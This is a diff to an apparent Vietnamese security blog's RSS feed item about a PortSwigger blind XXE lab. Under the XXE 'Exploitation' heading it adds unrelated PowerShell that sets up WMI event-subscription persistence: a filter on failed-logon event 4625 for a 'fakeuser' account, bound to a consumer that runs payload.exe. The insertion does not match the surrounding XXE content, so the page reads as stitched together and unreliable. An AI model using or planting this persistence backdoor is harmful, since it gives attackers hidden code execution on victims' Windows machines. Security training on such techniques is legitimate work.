@@ -116,6 +116,9 @@ Payload</p>
 <p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd" target="_blank" rel="noopener noreffer">đây</a>
 </p>
 <h2 id="exploitation-8">Exploitation</h2>
+<p>$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = &lsquo;root/cimv2&rsquo;; Name = &ldquo;UPDATER&rdquo;; Query = &ldquo;SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA &lsquo;Win32_NTLogEvent&rsquo; AND Targetinstance.EventCode = &lsquo;4625&rsquo; And Targetinstance.Message Like &lsquo;%fakeuser%&rsquo;&rdquo;; QueryLanguage = &lsquo;WQL&rsquo;}
+$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = &ldquo;UPDATER&rdquo;; CommandLineTemplate = &ldquo;C:\Users\sec560\Desktop\payload.exe&rdquo;}
+$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}</p>
 ]]></description>
 </item>
 <item>
